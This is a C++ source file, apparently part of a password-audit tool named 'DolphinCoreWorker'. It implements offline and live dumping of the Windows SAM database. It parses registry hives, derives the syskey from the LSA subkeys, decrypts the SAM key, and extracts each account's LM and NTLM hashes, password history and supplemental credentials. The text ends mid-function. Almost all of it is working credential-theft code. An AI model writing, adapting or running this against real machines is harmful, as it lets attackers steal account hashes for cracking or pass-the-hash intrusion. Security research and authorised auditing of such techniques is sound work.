#include "DolphinCoreWorker.h"
#include "utility/Logger.h"
#include <tlhelp32.h>

int ai_s_wpdump_sam(LPCWSTR szSystemFile, LPCWSTR szSamFile)
{
    int ret = HRA_FAILED;
    HANDLE hDataSystem, hDataSam;
    PAI_S_WPREG_HANDLE hRegistry, hRegistry2;
    HKEY hSystem, hSam;
    BYTE sysKey[SYSKEY_LENGTH];
    //LPCWSTR szSystem = NULL, szSam = NULL;
    if (szSystemFile != NULL && wcslen(szSystemFile) > 0)
    {
        hDataSystem = CreateFile(szSystemFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hDataSystem != INVALID_HANDLE_VALUE)
        {
            if (ai_s_wpreg_open(AI_S_WPREG_TYPE_HIVE, hDataSystem, FALSE, &hRegistry))
            {
                if (ai_s_wpdump_getComputerAndSyskey(hRegistry, NULL, sysKey))
                {
                    if (szSamFile != NULL && wcslen(szSamFile) > 0)
                    {
                        hDataSam = CreateFile(szSamFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                        if (hDataSam != INVALID_HANDLE_VALUE)
                        {
                            if (ai_s_wpreg_open(AI_S_WPREG_TYPE_HIVE, hDataSam, FALSE, &hRegistry2))
                            {
                                if (ai_s_wpdump_getUsersAndSamKey(hRegistry2, NULL, sysKey))
                                {
                                    ret = HRA_OK;
                                }
                                ai_s_wpreg_close(hRegistry2);
                            }
                            CloseHandle(hDataSam);
                        }
                        else
                        {
                            LOGW_ERROR(L"Read file error! file:%s, %lu", szSamFile, GetLastError());
                        }
                    }
                }
                ai_s_wpreg_close(hRegistry);
            }
            CloseHandle(hDataSystem);
        }
        else
        {
            LOGW_ERROR(L"Read file error! file:%s, %lu", szSystemFile, GetLastError());
        }
    }
    else
    {
        if (ai_s_wpreg_open(AI_S_WPREG_TYPE_OWN, NULL, FALSE, &hRegistry))
        {
            if (ai_s_wpreg_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hSystem))
            {
                if (ai_s_wpdump_getComputerAndSyskey(hRegistry, hSystem, sysKey))
                {
                    if (ai_s_wpreg_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hSam))
                    {
                        if (ai_s_wpdump_getUsersAndSamKey(hRegistry, hSam, sysKey) == TRUE)
                        {
                            ret = HRA_OK;
                        }
                        ai_s_wpreg_RegCloseKey(hRegistry, hSam);
                    }
                    else
                    {
                        LOG_ERROR("error! %lu", GetLastError());
                    }
                }
                ai_s_wpreg_RegCloseKey(hRegistry, hSystem);
            }
            ai_s_wpreg_close(hRegistry);
        }
    }
    return ret;
}


BOOL ai_s_wpreg_open(IN AI_S_WPREG_TYPE Type, IN HANDLE hAny, BOOL isWrite, OUT PAI_S_WPREG_HANDLE* hRegistry)
{
    BOOL status = FALSE;
    PAI_S_WPREG_HIVE_HEADER pFh;
    PAI_S_WPREG_HIVE_BIN_HEADER pBh;

    *hRegistry = (PAI_S_WPREG_HANDLE)LocalAlloc(LPTR, sizeof(AI_S_WPREG_HANDLE));
    if (*hRegistry)
    {
        (*hRegistry)->type = Type;
        switch (Type)
        {
        case AI_S_WPREG_TYPE_OWN:
            status = TRUE;
            break;
        case AI_S_WPREG_TYPE_HIVE:
            (*hRegistry)->pHandleHive = (PAI_S_WPREG_HIVE_HANDLE)LocalAlloc(LPTR, sizeof(AI_S_WPREG_HIVE_HANDLE));
            if ((*hRegistry)->pHandleHive)
            {
                (*hRegistry)->pHandleHive->hFileMapping = CreateFileMapping(hAny, NULL, isWrite ? PAGE_READWRITE : PAGE_READONLY, 0, 0, NULL);
                if ((*hRegistry)->pHandleHive->hFileMapping)
                {
                    (*hRegistry)->pHandleHive->pMapViewOfFile = MapViewOfFile((*hRegistry)->pHandleHive->hFileMapping, isWrite ? FILE_MAP_WRITE : FILE_MAP_READ, 0, 0, 0);
                    if (pFh = (PAI_S_WPREG_HIVE_HEADER)(*hRegistry)->pHandleHive->pMapViewOfFile)
                    {
                        if ((pFh->tag == 'fger') && (pFh->fileType == 0))
                        {
                            pBh = (PAI_S_WPREG_HIVE_BIN_HEADER)((PBYTE)pFh + sizeof(AI_S_WPREG_HIVE_HEADER));
                            if (pBh->tag == 'nibh')
                            {
                                (*hRegistry)->pHandleHive->pStartOf = (PBYTE)pBh;
                                (*hRegistry)->pHandleHive->pRootNamedKey = (PAI_S_WPREG_HIVE_KEY_NAMED)((PBYTE)pBh + sizeof(AI_S_WPREG_HIVE_BIN_HEADER) + pBh->offsetHiveBin);
                                status = (((*hRegistry)->pHandleHive->pRootNamedKey->tag == 'kn') && ((*hRegistry)->pHandleHive->pRootNamedKey->flags & (AI_S_WPREG_HIVE_KEY_NAMED_FLAG_ROOT | AI_S_WPREG_HIVE_KEY_NAMED_FLAG_LOCKED)));
                            }
                        }
                        if (!status)
                        {
                            UnmapViewOfFile((*hRegistry)->pHandleHive->pMapViewOfFile);
                            CloseHandle((*hRegistry)->pHandleHive->hFileMapping);
                        }
                    }
                }
            }
            break;
        default:
            break;
        }
        if (!status)
            LocalFree(*hRegistry);
    }
    return status;
}

PAI_S_WPREG_HANDLE ai_s_wpreg_close(IN PAI_S_WPREG_HANDLE hRegistry)
{
    if (hRegistry)
    {
        switch (hRegistry->type)
        {
        case AI_S_WPREG_TYPE_HIVE:
            if (hRegistry->pHandleHive)
            {
                if (hRegistry->pHandleHive->pMapViewOfFile)
                    UnmapViewOfFile(hRegistry->pHandleHive->pMapViewOfFile);
                if (hRegistry->pHandleHive->hFileMapping)
                    CloseHandle(hRegistry->pHandleHive->hFileMapping);
                LocalFree(hRegistry->pHandleHive);
            }
        default:
            break;
        }
        return (PAI_S_WPREG_HANDLE)LocalFree(hRegistry);
    }
    else return NULL;
}


BOOL ai_s_wpreg_RegOpenKeyEx(IN PAI_S_WPREG_HANDLE hRegistry, IN HKEY hKey, IN OPTIONAL LPCWSTR lpSubKey, IN DWORD ulOptions, IN REGSAM samDesired, OUT PHKEY phkResult)
{
    BOOL status = FALSE;
    DWORD dwErrCode;
    PAI_S_WPREG_HIVE_KEY_NAMED pKn;
    PAI_S_WPREG_HIVE_BIN_CELL pHbC;
    const wchar_t* ptrF; 
    wchar_t *buffer;

    *phkResult = 0;
    switch (hRegistry->type)
    {
    case AI_S_WPREG_TYPE_OWN:
        dwErrCode = RegOpenKeyEx(hKey, lpSubKey, ulOptions, samDesired, phkResult);
        if (!(status = (dwErrCode == ERROR_SUCCESS)))
            SetLastError(dwErrCode);
        break;
    case AI_S_WPREG_TYPE_HIVE:
        pKn = hKey ? (PAI_S_WPREG_HIVE_KEY_NAMED)hKey : hRegistry->pHandleHive->pRootNamedKey;
        if (pKn->tag == 'kn')
        {
            if (lpSubKey)
            {
                if (pKn->nbSubKeys && (pKn->offsetSubKeys != -1))
                {
                    pHbC = (PAI_S_WPREG_HIVE_BIN_CELL)(hRegistry->pHandleHive->pStartOf + pKn->offsetSubKeys);
                    if (ptrF = wcschr(lpSubKey, L'\\'))
                    {
                        if (buffer = (wchar_t*)LocalAlloc(LPTR, (ptrF - lpSubKey + 1) * sizeof(wchar_t)))
                        {
                            RtlCopyMemory(buffer, lpSubKey, (ptrF - lpSubKey) * sizeof(wchar_t));
                            if (*phkResult = (HKEY)ai_s_wpreg_searchKeyNamedInList(hRegistry, pHbC, buffer))
                                ai_s_wpreg_RegOpenKeyEx(hRegistry, *phkResult, ptrF + 1, ulOptions, samDesired, phkResult);
                            LocalFree(buffer);
                        }
                    }
                    else *phkResult = (HKEY)ai_s_wpreg_searchKeyNamedInList(hRegistry, pHbC, lpSubKey);
                }
            }
            else *phkResult = (HKEY)pKn;
        }
        status = (*phkResult != 0);
        break;
    default:
        break;
    }
    return status;
}

BOOL ai_s_wpreg_RegCloseKey(IN PAI_S_WPREG_HANDLE hRegistry, IN HKEY hKey)
{
    BOOL status = FALSE;
    DWORD dwErrCode;
    switch (hRegistry->type)
    {
    case AI_S_WPREG_TYPE_OWN:
        dwErrCode = RegCloseKey(hKey);
        if (!(status = (dwErrCode == ERROR_SUCCESS)))
            SetLastError(dwErrCode);
        break;
    case AI_S_WPREG_TYPE_HIVE:
        status = TRUE;
        break;
    default:
        break;
    }
    return status;
}

BOOL ai_s_wpdump_getComputerAndSyskey(IN PAI_S_WPREG_HANDLE hRegistry, IN HKEY hSystemBase, OUT LPBYTE sysKey)
{
    BOOL status = FALSE;
    PVOID computerName;
    HKEY hCurrentControlSet, hComputerNameOrLSA;

    if (ai_s_wpdump_getCurrentControlSet(hRegistry, hSystemBase, &hCurrentControlSet))
    {
        //kprintf(L"Domain : ");
        if (ai_s_wpreg_OpenAndQueryWithAlloc(hRegistry, hCurrentControlSet, L"Control\\ComputerName\\ComputerName", L"ComputerName", NULL, &computerName, NULL))
        {
            //kprintf(L"%s\n", computerName);
            LocalFree(computerName);
        }

        //kprintf(L"SysKey : ");
        if (ai_s_wpreg_RegOpenKeyEx(hRegistry, hCurrentControlSet, L"Control\\LSA", 0, KEY_READ, &hComputerNameOrLSA))
        {
            if (status = ai_s_wpdump_getSyskey(hRegistry, hComputerNameOrLSA, sysKey))
            {
                //ai_s_string_wprintf_hex(sysKey, SYSKEY_LENGTH, 0);
                //kprintf(L"\n");
            }
            else
            {
                LOG_ERROR("error! %lu", GetLastError());
            }
            ai_s_wpreg_RegCloseKey(hRegistry, hComputerNameOrLSA);
        }
        else
        {
            LOG_ERROR("error! %lu", GetLastError());
        }

        ai_s_wpreg_RegCloseKey(hRegistry, hCurrentControlSet);
    }
    return status;
}

BOOL ai_s_wpdump_getUsersAndSamKey(IN PAI_S_WPREG_HANDLE hRegistry, IN HKEY hSAMBase, IN LPCBYTE sysKey)
{
    BOOL status = FALSE;
    BYTE samKey[SAM_KEY_DATA_KEY_LENGTH];
    memset(samKey, 0, sizeof(samKey));
    DWORD name_len = 0;
    wchar_t* user = NULL;
    HKEY hAccount, hUsers, hUser;
    DWORD i = 0, nbSubKeys = 0, szMaxSubKeyLen = 0, szUser = 0, rid = 0;
    PUSER_ACCOUNT_V pUAv = NULL;
    //LPVOID data;
    wchar_t user_name[MAX_USER_NAME_SIZE];
    memset(user_name, 0, sizeof(user_name));

    //if (ai_s_wpreg_OpenAndQueryWithAlloc(hRegistry, hSAMBase, L"SAM\\Domains\\Account", L"V", NULL, &data, &szUser))
    //{
    //    kprintf(L"Local SID : ");
    //    ai_s_string_displaySID((PBYTE)data + szUser - (sizeof(SID) + sizeof(DWORD) * 3));
    //    kprintf(L"\n");
    //    LocalFree(data);
    //}

    if (ai_s_wpreg_RegOpenKeyEx(hRegistry, hSAMBase, L"SAM\\Domains\\Account", 0, KEY_READ, &hAccount))
    {
        if (ai_s_wpdump_getSamKey(hRegistry, hAccount, sysKey, samKey))
        {
            if (ai_s_wpreg_RegOpenKeyEx(hRegistry, hAccount, L"Users", 0, KEY_READ, &hUsers))
            {
                status = ai_s_wpreg_RegQueryInfoKey(hRegistry, hUsers, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen,
                                                    NULL, NULL, NULL, NULL, NULL, NULL);
                if (status)
                {
                    LOGW_INFO(L"Sub user key count:%lu", nbSubKeys);
                    szMaxSubKeyLen++;
                    if (user = (wchar_t*)LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
                    {
                        for (i = 0; i < nbSubKeys; i++)
                        {
                            szUser = szMaxSubKeyLen;
                            if (ai_s_wpreg_RegEnumKeyEx(hRegistry, hUsers, i, user, &szUser, NULL, NULL, NULL, NULL))
                            {
                                //LOGW_DEBUG(L"user:%s", user);
                                if (_wcsicmp(user, L"Names"))
                                {
                                    if (swscanf_s(user, L"%x", &rid) != -1)
                                    {
                                        //kprintf(L"\nRID  : %08x (%u)\n", rid, rid);
                                        if (status &= ai_s_wpreg_RegOpenKeyEx(hRegistry, hUsers, user, 0, KEY_READ, &hUser))
                                        {
                                            if (status &= ai_s_wpreg_QueryWithAlloc(hRegistry, hUser, L"V", NULL, (LPVOID*)&pUAv, NULL))
                                            {
                                                memset(user_name, 0, sizeof(user_name));
                                                name_len = pUAv->Username.lenght < (MAX_USER_NAME_SIZE - 1) ? pUAv->Username.lenght : (MAX_USER_NAME_SIZE - 1);
                                                memcpy(user_name, (wchar_t*)(pUAv->datas + pUAv->Username.offset), name_len);
                                                DolphinCoreWorker_AddUser(user_name);

                                                //kprintf(L"User : %.*s\n", pUAv->Username.lenght / sizeof(wchar_t), (wchar_t*)(pUAv->datas + pUAv->Username.offset));
                                                ai_s_wpdump_getHash(&pUAv->LMHash, pUAv->datas, samKey, rid, FALSE, FALSE);
                                                ai_s_wpdump_getHash(&pUAv->NTLMHash, pUAv->datas, samKey, rid, TRUE, FALSE);
                                                ai_s_wpdump_getHash(&pUAv->LMHistory, pUAv->datas, samKey, rid, FALSE, TRUE);
                                                ai_s_wpdump_getHash(&pUAv->NTLMHistory, pUAv->datas, samKey, rid, TRUE, TRUE);
                                                LocalFree(pUAv);
                                            }
                                            ai_s_wpdump_getSupplementalCreds(hRegistry, hUser, samKey);
                                            ai_s_wpreg_RegCloseKey(hRegistry, hUser);
                                        }
                                        else LOG_ERROR("error user (%s) %lu", user, GetLastError());
                                    }
                                }
                            }
                            else
                            {
                                LOGW_WARN(L"ai_s_wpreg_RegEnumKeyEx failed! %lu", GetLastError());
                                break;
                            }
                        }
                        LocalFree(user);
                    }
                }
                ai_s_wpreg_RegCloseKey(hRegistry, hUsers);
            }
        }
        else
            LOG_ERROR("error! %lu", GetLastError());
        ai_s_wpreg_RegCloseKey(hRegistry, hAccount);
    }
    else
        LOG_ERROR("error! %lu", GetLastError());

    return status;
}


PAI_S_WPREG_HIVE_KEY_NAMED ai_s_wpreg_searchKeyNamedInList(IN PAI_S_WPREG_HANDLE hRegistry, IN PAI_S_WPREG_HIVE_BIN_CELL pHbC, IN LPCWSTR lpSubKey)
{
    PAI_S_WPREG_HIVE_KEY_NAMED pKn, result = NULL;
    PAI_S_WPREG_HIVE_LF_LH pLfLh;
    DWORD i;
    wchar_t* buffer;

    switch (pHbC->tag)
    {
    case 'fl':
    case 'hl':
        pLfLh = (PAI_S_WPREG_HIVE_LF_LH)pHbC;
        for (i = 0; i < pLfLh->nbElements && !result; i++)
        {
            pKn = (PAI_S_WPREG_HIVE_KEY_NAMED)(hRegistry->pHandleHive->pStartOf + pLfLh->elements[i].offsetNamedKey);
            if (pKn->tag == 'kn')
            {
                if (pKn->flags & AI_S_WPREG_HIVE_KEY_NAMED_FLAG_ASCII_NAME)
                    buffer = ai_s_string_qad_ansi_c_to_unicode((char*)pKn->keyName, pKn->szKeyName);
                else if (buffer = (wchar_t*)LocalAlloc(LPTR, pKn->szKeyName + sizeof(wchar_t)))
                    RtlCopyMemory(buffer, pKn->keyName, pKn->szKeyName);

                if (buffer)
                {
                    if (_wcsicmp(lpSubKey, buffer) == 0)
                        result = pKn;
                    LocalFree(buffer);
                }
            }
        }
        break;
    case 'il':
    case 'ir':
    default:
        break;
    }
    return result;
}

const wchar_t* ai_s_wpdump_CONTROLSET_SOURCES[] = {L"Current", L"Default"};
BOOL ai_s_wpdump_getCurrentControlSet(PAI_S_WPREG_HANDLE hRegistry, HKEY hSystemBase, PHKEY phCurrentControlSet)
{
    BOOL status = FALSE;
    HKEY hSelect;
    DWORD i, szNeeded, controlSet;

    wchar_t currentControlSet[] = L"ControlSet000";

    if (ai_s_wpreg_RegOpenKeyEx(hRegistry, hSystemBase, L"Select", 0, KEY_READ, &hSelect))
    {
        for (i = 0; !status && (i < ARRAYSIZE(ai_s_wpdump_CONTROLSET_SOURCES)); i++)
        {
            szNeeded = sizeof(DWORD);
            status = ai_s_wpreg_RegQueryValueEx(hRegistry, hSelect, ai_s_wpdump_CONTROLSET_SOURCES[i], NULL, NULL, (LPBYTE)&controlSet, &szNeeded);
        }

        if (status)
        {
            status = FALSE;
            if (swprintf_s(currentControlSet + 10, 4, L"%03u", controlSet) != -1)
                status = ai_s_wpreg_RegOpenKeyEx(hRegistry, hSystemBase, currentControlSet, 0, KEY_READ, phCurrentControlSet);
        }
        ai_s_wpreg_RegCloseKey(hRegistry, hSelect);
    }
    return status;
}

BOOL ai_s_wpreg_OpenAndQueryWithAlloc(IN PAI_S_WPREG_HANDLE hRegistry, IN HKEY hKey, IN OPTIONAL LPCWSTR lpSubKey, IN OPTIONAL LPCWSTR lpValueName, OUT OPTIONAL LPDWORD lpType, OUT OPTIONAL LPVOID* lpData, IN OUT OPTIONAL LPDWORD lpcbData)
{
    BOOL status = FALSE;
    HKEY hResult;
    if (ai_s_wpreg_RegOpenKeyEx(hRegistry, hKey, lpSubKey, 0, KEY_READ, &hResult))
    {
        status = ai_s_wpreg_QueryWithAlloc(hRegistry, hResult, lpValueName, lpType, lpData, lpcbData);
        ai_s_wpreg_RegCloseKey(hRegistry, hResult);
    }
    else
        LOG_ERROR("error! %lu", GetLastError());
    return status;
}

const wchar_t* ai_s_wpdump_SYSKEY_NAMES[] = {L"JD", L"Skew1", L"GBG", L"Data"};
const BYTE ai_s_wpdump_SYSKEY_PERMUT[] = {11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4};
BOOL ai_s_wpdump_getSyskey(PAI_S_WPREG_HANDLE hRegistry, HKEY hLSA, LPBYTE sysKey)
{
    BOOL status = TRUE;
    DWORD i;
    HKEY hKey;
    wchar_t buffer[8 + 1];
    DWORD szBuffer;
    BYTE buffKey[SYSKEY_LENGTH];

    for (i = 0; (i < ARRAYSIZE(ai_s_wpdump_SYSKEY_NAMES)) && status; i++)
    {
        status = FALSE;
        if (ai_s_wpreg_RegOpenKeyEx(hRegistry, hLSA, ai_s_wpdump_SYSKEY_NAMES[i], 0, KEY_READ, &hKey))
        {
            szBuffer = 8 + 1;
            if (ai_s_wpreg_RegQueryInfoKey(hRegistry, hKey, buffer, &szBuffer, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))
                status = swscanf_s(buffer, L"%x", (DWORD*)&buffKey[i * sizeof(DWORD)]) != -1;
            ai_s_wpreg_RegCloseKey(hRegistry, hKey);
        }
        else
            LOG_ERROR("error! %lu", GetLastError());
    }

    if (status)
        for (i = 0; i < SYSKEY_LENGTH; i++)
            sysKey[i] = buffKey[ai_s_wpdump_SYSKEY_PERMUT[i]];

    return status;
}


const BYTE ai_s_wpdump_qwertyuiopazxc[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
const BYTE ai_s_wpdump_01234567890123[] = "0123456789012345678901234567890123456789";
BOOL ai_s_wpdump_getSamKey(PAI_S_WPREG_HANDLE hRegistry, HKEY hAccount, LPCBYTE sysKey, LPBYTE samKey)
{
    BOOL status = FALSE;
    PDOMAIN_ACCOUNT_F pDomAccF;
    AP_MD5_CTX md5ctx;
    BYTE md5_digest[MD5_DIGEST_LENGTH];
    DATA_KEY key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5_digest};
    CRYPT_BUFFER data = {SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey};
    PSAM_KEY_DATA_AES pAesKey;
    PVOID out;
    DWORD len;

    //kprintf(L"\nSAMKey : ");
    if (ai_s_wpreg_OpenAndQueryWithAlloc(hRegistry, hAccount, NULL, L"F", NULL, (LPVOID*)&pDomAccF, NULL))
    {
        switch (pDomAccF->Revision)
        {
        case 2:
        case 3:
            switch (pDomAccF->keys1.Revision)
            {
            case 1:
                ap_MD5Init(&md5ctx);
                ap_MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);
                ap_MD5Update(&md5ctx, ai_s_wpdump_qwertyuiopazxc, sizeof(ai_s_wpdump_qwertyuiopazxc));
                ap_MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
                ap_MD5Update(&md5ctx, ai_s_wpdump_01234567890123, sizeof(ai_s_wpdump_01234567890123));
                ap_MD5Final(md5_digest, &md5ctx);
                RtlCopyMemory(samKey, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);
                if (!(status = NT_SUCCESS(RtlDecryptData2(&data, &key))))
                    LOG_ERROR("error! %lu", GetLastError());
                break;
            case 2:
                pAesKey = (PSAM_KEY_DATA_AES)&pDomAccF->keys1;
                if (ai_s_crypto_genericAES128Decrypt(sysKey, pAesKey->Salt, pAesKey->data, pAesKey->DataLen, &out, &len))
                {
                    if (status = (len == SAM_KEY_DATA_KEY_LENGTH))
                        RtlCopyMemory(samKey, out, SAM_KEY_DATA_KEY_LENGTH);
                    LocalFree(out);
                }
                break;
            default:
                LOG_ERROR("error (%lu)", pDomAccF->keys1.Revision);
            }
            break;
        default:
            LOG_ERROR("error (%hu)", pDomAccF->Revision);
        }
        LocalFree(pDomAccF);
    }
    else
        LOG_ERROR("error! %lu", GetLastError());

    //if (status)
    //    ai_s_string_wprintf_hex(samKey, LM_NTLM_HASH_LENGTH, 0);

    //kprintf(L"\n");
    return status;
}


BOOL ai_s_wpreg_RegQueryInfoKey(IN PAI_S_WPREG_HANDLE hRegistry, IN HKEY hKey, OUT OPTIONAL LPWSTR lpClass,
                                IN OUT OPTIONAL LPDWORD lpcClass, IN OPTIONAL LPDWORD lpReserved,
                                OUT OPTIONAL LPDWORD lpcSubKeys, OUT OPTIONAL LPDWORD lpcMaxSubKeyLen,
                                OUT OPTIONAL LPDWORD lpcMaxClassLen, OUT OPTIONAL LPDWORD lpcValues,
                                OUT OPTIONAL LPDWORD lpcMaxValueNameLen, OUT OPTIONAL LPDWORD lpcMaxValueLen,
                                OUT OPTIONAL LPDWORD lpcbSecurityDescriptor, OUT OPTIONAL PFILETIME lpftLastWriteTime)
{
    BOOL status = FALSE;
    DWORD dwErrCode;
    PAI_S_WPREG_HIVE_KEY_NAMED pKn;
    DWORD szInCar;

    switch (hRegistry->type)
    {
    case AI_S_WPREG_TYPE_OWN:
        dwErrCode = RegQueryInfoKey(hKey, lpClass, lpcClass, lpReserved, lpcSubKeys, lpcMaxSubKeyLen, lpcMaxClassLen, lpcValues, lpcMaxValueNameLen, lpcMaxValueLen, lpcbSecurityDescriptor, lpftLastWriteTime);
        if (!(status = (dwErrCode == ERROR_SUCCESS)))
            SetLastError(dwErrCode);
        break;
    case AI_S_WPREG_TYPE_HIVE:
        pKn = hKey ? (PAI_S_WPREG_HIVE_KEY_NAMED)hKey : hRegistry->pHandleHive->pRootNamedKey;
        if (status = (pKn->tag == 'kn'))
        {
            if (lpcSubKeys)
                *lpcSubKeys = pKn->nbSubKeys;

            if (lpcMaxSubKeyLen)
                *lpcMaxSubKeyLen = pKn->szMaxSubKeyName / sizeof(wchar_t);

            if (lpcMaxClassLen)
                *lpcMaxClassLen = pKn->szMaxSubKeyClassName / sizeof(wchar_t);

            if (lpcValues)
                *lpcValues = pKn->nbValues;

            if (lpcMaxValueNameLen)
                *lpcMaxValueNameLen = pKn->szMaxValueName / sizeof(wchar_t);

            if (lpcMaxValueLen)
                *lpcMaxValueLen = pKn->szMaxValueData;

            if (lpcbSecurityDescriptor)
                *lpcbSecurityDescriptor = 0; /* NOT SUPPORTED */

            if (lpftLastWriteTime)
                *lpftLastWriteTime = pKn->lastModification;

            if (lpcClass)
            {
                szInCar = pKn->szClassName / sizeof(wchar_t);
                if (lpClass)
                {
                    if (status = (*lpcClass > szInCar))
                    {
                        RtlCopyMemory(lpClass, &((PAI_S_WPREG_HIVE_BIN_CELL)(hRegistry->pHandleHive->pStartOf + pKn->offsetClassName))->data, pKn->szClassName);
                        lpClass[szInCar] = L'\0';
                    }
                }
                *lpcClass = szInCar;
            }
        }
        break;
    default:
        break;
    }

    return status;
}

BOOL ai_s_wpreg_RegEnumKeyEx(IN PAI_S_WPREG_HANDLE hRegistry, IN HKEY hKey, IN DWORD dwIndex, OUT LPWSTR lpName, IN OUT LPDWORD lpcName, IN LPDWORD lpReserved, OUT OPTIONAL LPWSTR lpClass, IN OUT OPTIONAL LPDWORD lpcClass, OUT OPTIONAL PFILETIME lpftLastWriteTime)
{
    BOOL status = FALSE;
    DWORD dwErrCode, szInCar;
    PAI_S_WPREG_HIVE_KEY_NAMED pKn, pCandidateKn;
    PAI_S_WPREG_HIVE_BIN_CELL pHbC;
    PAI_S_WPREG_HIVE_LF_LH pLfLh;
    wchar_t* buffer;

    switch (hRegistry->type)
    {
    case AI_S_WPREG_TYPE_OWN:
        dwErrCode = RegEnumKeyEx(hKey, dwIndex, lpName, lpcName, lpReserved, lpClass, lpcClass, lpftLastWriteTime);
        if (!(status = (dwErrCode == ERROR_SUCCESS)))
            SetLastError(dwErrCode);
        break;
    case AI_S_WPREG_TYPE_HIVE:
        pKn = (PAI_S_WPREG_HIVE_KEY_NAMED)hKey;
        if (pKn->nbSubKeys && (dwIndex < pKn->nbSubKeys) && (pKn->offsetSubKeys != -1))
        {
            pHbC = (PAI_S_WPREG_HIVE_BIN_CELL)(hRegistry->pHandleHive->pStartOf + pKn->offsetSubKeys);
            switch (pHbC->tag)
            {
            case 'fl':
            case 'hl':
                pLfLh = (PAI_S_WPREG_HIVE_LF_LH)pHbC;
                if (pLfLh->nbElements && (dwIndex < pLfLh->nbElements))
                {
                    pCandidateKn = (PAI_S_WPREG_HIVE_KEY_NAMED)(hRegistry->pHandleHive->pStartOf + pLfLh->elements[dwIndex].offsetNamedKey);
                    if ((pCandidateKn->tag == 'kn') && lpName && lpcName)
                    {
                        if (lpftLastWriteTime)
                            *lpftLastWriteTime = pKn->lastModification;

                        if (pCandidateKn->flags & AI_S_WPREG_HIVE_KEY_NAMED_FLAG_ASCII_NAME)
                        {
                            szInCar = pCandidateKn->szKeyName;
                            if (status = (*lpcName > szInCar))
                            {
                                if (buffer = ai_s_string_qad_ansi_c_to_unicode((char*)pCandidateKn->keyName, szInCar))
                                {
                                    RtlCopyMemory(lpName, buffer, szInCar * sizeof(wchar_t));
                                    LocalFree(buffer);
                                }
                            }
                        }
                        else
                        {
                            szInCar = pCandidateKn->szKeyName / sizeof(wchar_t);
                            if (status = (*lpcName > szInCar))
                                RtlCopyMemory(lpName, pCandidateKn->keyName, pKn->szKeyName);
                        }
                        if (status)
                            lpName[szInCar] = L'\0';
                        *lpcName = szInCar;

                        if (lpcClass)
                        {
                            szInCar = pCandidateKn->szClassName / sizeof(wchar_t);
                            if (lpClass)
                            {
                                if (status = (*lpcClass > szInCar))
                                {
                                    RtlCopyMemory(lpClass, &((PAI_S_WPREG_HIVE_BIN_CELL)(hRegistry->pHandleHive->pStartOf + pCandidateKn->offsetClassName))->data, pCandidateKn->szClassName);
                                    lpClass[szInCar] = L'\0';
                                }
                            }
                            *lpcClass = szInCar;
                        }
                    }
                }
                break;
            case 'il':
            case 'ir':
            default:
                break;
            }
        }
        break;
    default:
        break;
    }
    return status;
}


BOOL ai_s_wpreg_QueryWithAlloc(IN PAI_S_WPREG_HANDLE hRegistry, IN HKEY hKey, IN OPTIONAL LPCWSTR lpValueName, OUT OPTIONAL LPDWORD lpType, OUT OPTIONAL LPVOID* lpData, IN OUT OPTIONAL LPDWORD lpcbData)
{
    BOOL status = FALSE;
    DWORD szNeeded = 0;
    if (ai_s_wpreg_RegQueryValueEx(hRegistry, hKey, lpValueName, NULL, lpType, NULL, &szNeeded))
    {
        if (szNeeded)
        {
            if (*lpData = LocalAlloc(LPTR, szNeeded))
            {
                status = ai_s_wpreg_RegQueryValueEx(hRegistry, hKey, lpValueName, NULL, lpType, (LPBYTE)*lpData, &szNeeded);
                if (status)
                {
                    if (lpcbData)
                        *lpcbData = szNeeded;
                }
                else
                {
                    LOG_ERROR("error! %lu", GetLastError());
                    *lpData = LocalFree(*lpData);
                }
            }
        }
    }
    else
        LOG_ERROR("error! %lu", GetLastError());
    return status;
}

const BYTE	ai_s_wpdump_NTPASSWORD[] = "NTPASSWORD",
ai_s_wpdump_LMPASSWORD[] = "LMPASSWORD",
ai_s_wpdump_NTPASSWORDHISTORY[] = "NTPASSWORDHISTORY",
ai_s_wpdump_LMPASSWORDHISTORY[] = "LMPASSWORDHISTORY";
BOOL ai_s_wpdump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE samKey, DWORD rid, BOOL isNtlm, BOOL isHistory)
{
    BOOL status = FALSE;
    AP_MD5_CTX md5ctx;
    BYTE md5_digest[MD5_DIGEST_LENGTH];
    PSAM_HASH pHash = (PSAM_HASH)(pStartOfData + pSamHash->offset);
    PSAM_HASH_AES pHashAes;
    DATA_KEY keyBuffer = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5_digest};
    CRYPT_BUFFER cypheredHashBuffer = {0, 0, NULL};
    PVOID out;
    DWORD len;

    if (pSamHash->offset && pSamHash->lenght)
    {
        switch (pHash->Revision)
        {
        case 1:
            if (pSamHash->lenght >= sizeof(SAM_HASH))
            {
                ap_MD5Init(&md5ctx);
                ap_MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
                ap_MD5Update(&md5ctx, (unsigned char*)&rid, sizeof(DWORD));
                ap_MD5Update(&md5ctx, isNtlm ? (isHistory ? ai_s_wpdump_NTPASSWORDHISTORY : ai_s_wpdump_NTPASSWORD) : (isHistory ? ai_s_wpdump_LMPASSWORDHISTORY : ai_s_wpdump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(ai_s_wpdump_NTPASSWORDHISTORY) : sizeof(ai_s_wpdump_NTPASSWORD)) : (isHistory ? sizeof(ai_s_wpdump_LMPASSWORDHISTORY) : sizeof(ai_s_wpdump_LMPASSWORD)));
                ap_MD5Final(md5_digest, &md5ctx);
